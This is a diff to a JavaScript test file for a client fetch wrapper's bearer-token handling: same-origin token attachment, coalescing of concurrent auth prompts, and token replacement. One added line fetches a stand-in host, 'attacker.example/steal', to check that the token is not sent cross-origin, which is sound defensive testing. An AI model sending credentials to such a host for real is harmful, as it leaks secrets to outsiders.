@@ -57,9 +57,13 @@ test('stored API token is attached only to same-origin requests', async() => {
   const state = fixture({token:'secret'});
   await state.window.fetch('/status');
   await state.window.fetch('https://example.invalid/status');
+  await state.window.fetch(new URL('http://relaytv.local/playback/state'));
+  await state.window.fetch(new URL('https://attacker.example/steal'));
 
   assert.equal(state.calls[0].options.headers.get('authorization'), 'Bearer secret');
   assert.equal(state.calls[1].options.headers, undefined);
+  assert.equal(state.calls[2].options.headers.get('authorization'), 'Bearer secret');
+  assert.equal(state.calls[3].options.headers, undefined);
 });
 
 test('a Bearer challenge retries once after explicit token entry', async() => {
@@ -196,4 +200,61 @@ test('forgetToken clears stored credentials and allows a future Bearer challenge
   assert.equal(r2.status, 200);
   assert.equal(count2, 2);
   assert.equal(state2.api.storedToken(), 'fresh-secret');
+});
+
+test('concurrent Bearer challenges coalesce onto one prompt and retry both requests', async() => {
+  let dialogCalls = 0;
+  let releasePrompt = null;
+  let attempts = 0;
+  const state = fixture({
+    responder:() => {
+      attempts += 1;
+      return attempts <= 2 ? response(401, 'Bearer realm="relaytv"') : response(200);
+    },
+  });
+  state.api.setTokenPrompt(() => {
+    dialogCalls += 1;
+    return new Promise((resolve) => {
+      releasePrompt = () => resolve({action:'submit', token:'shared-secret'});
+    });
+  });
+
+  const p1 = state.window.fetch('/peers/a/probe', {method:'POST'});
+  const p2 = state.window.fetch('/peers/b/probe', {method:'POST'});
+  await new Promise((r) => setTimeout(r, 10));
+  assert.equal(dialogCalls, 1);
+  releasePrompt();
+
+  const [r1, r2] = await Promise.all([p1, p2]);
+  assert.equal(r1.status, 200);
+  assert.equal(r2.status, 200);
+  assert.equal(dialogCalls, 1);
+  assert.equal(state.calls.length, 4);
+  assert.equal(state.calls[2].options.headers.get('authorization'), 'Bearer shared-secret');
+  assert.equal(state.calls[3].options.headers.get('authorization'), 'Bearer shared-secret');
+});
+
+test('storing a replacement token resets prompt suppression for future challenges', async() => {
+  let dialogCalls = 0;
+  let step = 0;
+  const state = fixture({
+    responder:() => {
+      step += 1;
+      return step <= 2 ? response(401, 'Bearer realm="relaytv"') : response(200);
+    },
+  });
+  state.api.setTokenPrompt(async () => {
+    dialogCalls += 1;
+    return dialogCalls === 1 ? {action:'cancel', token:''} : {action:'submit', token:'good-token'};
+  });
+
+  const first = await state.window.fetch('/pause', {method:'POST'});
+  assert.equal(first.status, 401);
+  assert.equal(dialogCalls, 1);
+
+  state.api.storeToken('typo-token');
+  const second = await state.window.fetch('/pause', {method:'POST'});
+  assert.equal(second.status, 200);
+  assert.equal(dialogCalls, 2);
+  assert.equal(state.api.storedToken(), 'good-token');
 });
